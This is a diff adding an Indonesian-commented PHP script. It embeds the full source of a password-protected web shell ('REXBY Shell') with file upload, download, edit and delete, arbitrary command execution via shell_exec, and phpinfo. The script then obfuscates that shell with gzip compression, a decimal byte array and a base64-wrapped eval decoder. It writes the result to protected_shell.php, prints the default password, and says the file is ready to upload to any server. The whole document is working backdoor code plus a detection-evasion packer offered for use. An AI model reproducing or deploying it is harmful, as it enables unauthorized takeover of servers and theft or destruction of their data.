@@ -1,0 +1,175 @@
+<?php
+// UNIVERSAL ENCODER - Buat script yang bisa jalan di server manapun
+
+// SCRIPT ASLI YANG AKAN DIPROTEKSI (REXBY Shell lengkap)
+$original_code = '<?php
+session_start();
+$auth_pass = md5("admin123");
+
+function login_page() {
+    echo \'<html><head><title>Login</title>
+    <style>body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+    .login{background:#16213e;padding:40px;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.5);width:300px}
+    h3{color:#e94560;text-align:center}
+    input[type=password]{width:100%;padding:12px;margin:10px 0;border:none;border-radius:5px;background:#0f3460;color:white}
+    input[type=submit]{width:100%;padding:12px;background:#e94560;border:none;border-radius:5px;color:white;cursor:pointer;font-weight:bold}
+    input[type=submit]:hover{background:#c73e54}
+    .error{color:#ff6b6b;text-align:center}</style>
+    </head><body>
+    <div class=login>
+        <h3>🔐 Login Required</h3>
+        <form method=post>
+            <input type=password name=pass placeholder="Enter password">
+            <input type=submit value="Login">
+        </form>
+    </div></body></html>\';
+    exit;
+}
+
+if (!isset($_SESSION[\'auth\']) || $_SESSION[\'auth\'] !== true) {
+    if (isset($_POST[\'pass\']) && md5($_POST[\'pass\']) === $auth_pass) {
+        $_SESSION[\'auth\'] = true;
+    } else {
+        login_page();
+    }
+}
+
+function files_man() {
+    $dir = isset($_GET[\'dir\']) ? $_GET[\'dir\'] : \'.\';
+    if (!is_dir($dir)) $dir = dirname($dir);
+    $files = scandir($dir);
+    echo "<div style=\'font-family:monospace;background:#1a1a2e;padding:20px;border-radius:5px;color:#eee\'>";
+    echo "<h3 style=\'color:#e94560\'>📁 File Manager - $dir</h3>";
+    echo "<form method=post enctype=multipart/form-data style=\'margin:10px 0\'>";
+    echo "<input type=file name=file style=\'background:#0f3460;color:white;padding:5px;border:none;border-radius:3px\'>";
+    echo "<input type=submit value=Upload style=\'background:#e94560;border:none;color:white;padding:5px 10px;border-radius:3px;cursor:pointer\'>";
+    echo "</form><hr style=\'border-color:#333\'>";
+    foreach($files as $f) {
+        if($f == ".") continue;
+        $path = $dir."/".$f;
+        if(is_dir($path)) {
+            echo "<div style=\'margin:3px 0\'><span style=\'color:#ffd93d\'>📁</span> <a href=\'?a=FilesMan&dir=$path\' style=\'color:#ffd93d;text-decoration:none\'>$f/</a></div>";
+        } else {
+            $size = filesize($path);
+            echo "<div style=\'margin:3px 0\'><span style=\'color:#6bcb77\'>📄</span> <a href=\'?a=Download&f=$path\' style=\'color:#6bcb77;text-decoration:none\'>$f</a> ";
+            echo "<span style=\'color:#888;font-size:12px\'>($size bytes)</span> ";
+            echo "<a href=\'?a=Edit&f=$path\' style=\'color:#4d96ff;text-decoration:none;font-size:12px\'>[Edit]</a> ";
+            echo "<a href=\'?a=Delete&f=$path\' style=\'color:#ff6b6b;text-decoration:none;font-size:12px\'>[Delete]</a></div>";
+        }
+    }
+    echo "</div>";
+}
+
+function exec_cmd() {
+    echo "<div style=\'font-family:monospace;background:#1a1a2e;padding:20px;border-radius:5px;color:#eee\'>";
+    echo "<h3 style=\'color:#e94560\'>💻 Command Executor</h3>";
+    if(isset($_POST[\'cmd\'])) {
+        $cmd = $_POST[\'cmd\'];
+        echo "<div style=\'background:#0f3460;padding:10px;border-radius:3px;margin:10px 0\'>";
+        echo "<span style=\'color:#ffd93d\'>$</span> <span style=\'color:#6bcb77\'>" . htmlspecialchars($cmd) . "</span>";
+        echo "</div>";
+        echo "<pre style=\'background:#0a0a1a;padding:15px;border-radius:5px;overflow:auto;max-height:400px;color:#eee\'>";
+        echo shell_exec($cmd);
+        echo "</pre>";
+    }
+    echo \'<form method=post><input type=text name=cmd placeholder="Enter command" style="width:80%;padding:10px;background:#0f3460;border:none;border-radius:5px;color:white">
+    <input type=submit value="Execute" style="background:#e94560;border:none;color:white;padding:10px 20px;border-radius:5px;cursor:pointer"></form>\';
+    echo "</div>";
+}
+
+function download_file() {
+    $file = $_GET[\'f\'];
+    if(file_exists($file)) {
+        header(\'Content-Type: application/octet-stream\');
+        header(\'Content-Disposition: attachment; filename="\'.basename($file).\'"\');
+        header(\'Content-Length: \'.filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+function edit_file() {
+    $file = $_GET[\'f\'];
+    echo "<div style=\'font-family:monospace;background:#1a1a2e;padding:20px;border-radius:5px;color:#eee\'>";
+    echo "<h3 style=\'color:#e94560\'>✏️ Edit File - " . basename($file) . "</h3>";
+    if(isset($_POST[\'content\'])) {
+        file_put_contents($file, $_POST[\'content\']);
+        echo "<div style=\'background:#0f3460;padding:10px;border-radius:3px;color:#6bcb77\'>✅ File updated successfully!</div>";
+        echo "<br>";
+    }
+    $content = file_exists($file) ? file_get_contents($file) : "";
+    echo \'<form method=post><textarea name=content style="width:100%;height:400px;background:#0a0a1a;border:none;border-radius:5px;color:#eee;padding:10px;font-family:monospace">\'.htmlspecialchars($content).\'</textarea><br>
+    <input type=submit value="Save" style="background:#e94560;border:none;color:white;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:10px"></form>\';
+    echo "</div>";
+}
+
+function delete_file() {
+    $file = $_GET[\'f\'];
+    if(unlink($file)) {
+        echo "<div style=\'font-family:monospace;background:#1a1a2e;padding:20px;border-radius:5px;color:#eee\'><h3 style=\'color:#6bcb77\'>✅ File deleted!</h3></div>";
+    } else {
+        echo "<div style=\'font-family:monospace;background:#1a1a2e;padding:20px;border-radius:5px;color:#eee\'><h3 style=\'color:#ff6b6b\'>❌ Delete failed!</h3></div>";
+    }
+}
+
+$action = isset($_GET[\'a\']) ? $_GET[\'a\'] : \'FilesMan\';
+
+// Style header
+echo \'<html><head><title>REXBY Shell</title>
+<style>body{margin:0;background:#0a0a1a;font-family:Arial;padding:20px}
+a{color:#4d96ff;text-decoration:none;padding:8px 15px;background:#16213e;border-radius:5px;margin:0 5px}
+a:hover{background:#1a2a4a;color:#6bcb77}
+hr{border-color:#333;margin:15px 0}
+.menu{background:#16213e;padding:15px;border-radius:5px;margin-bottom:20px}
+</style></head><body>\';
+echo \'<div class="menu">\';
+echo \'<a href="?a=FilesMan">📁 Files</a>\';
+echo \'<a href="?a=Exec">💻 Exec</a>\';
+echo \'<a href="?a=PhpInfo">ℹ️ Info</a>\';
+echo \'<a href="?a=SelfRemove">🗑️ Remove</a>\';
+echo \'</div><hr>\';
+
+switch($action) {
+    case \'FilesMan\': files_man(); break;
+    case \'Exec\': exec_cmd(); break;
+    case \'PhpInfo\': phpinfo(); break;
+    case \'Download\': download_file(); break;
+    case \'Edit\': edit_file(); break;
+    case \'Delete\': delete_file(); break;
+    case \'SelfRemove\': unlink(__FILE__); echo "Removed"; break;
+    default: echo "<div style=\'color:#eee\'>Select action</div>";
+}
+echo \'</body></html>\';
+?>';
+
+// --- PROSES ENCODING ---
+echo "🔧 Memproses encoding...\n";
+
+// 1. Kompresi dengan level maksimum
+$compressed = gzcompress($original_code, 9);
+
+// 2. Ubah ke array desimal
+$bytes = unpack('C*', $compressed);
+$decimal_array = implode(',', $bytes);
+
+// 3. Decoder dalam Base64
+$decoder_code = '$k=explode(",",$d);$b=implode(array_map("chr",$k));eval("?>".gzuncompress($b));';
+$decoder_base64 = base64_encode($decoder_code);
+
+// 4. Hasil final dengan obfuscation tambahan
+$final = '<?php
+/* REXBY SECURE SHELL v4.4 - Universal Protector */
+$u = "' . $decoder_base64 . '";
+$d = "' . $decimal_array . '";
+eval(base64_decode($u));
+exit;
+?>';
+
+// 5. Simpan file
+file_put_contents('protected_shell.php', $final);
+echo "✅ Script berhasil diproteksi!\n";
+echo "📁 File: protected_shell.php\n";
+echo "🔑 Password: admin123\n";
+echo "📊 Size: " . filesize('protected_shell.php') . " bytes\n";
+echo "🚀 Siap di-upload ke server mana pun!\n";
+?>
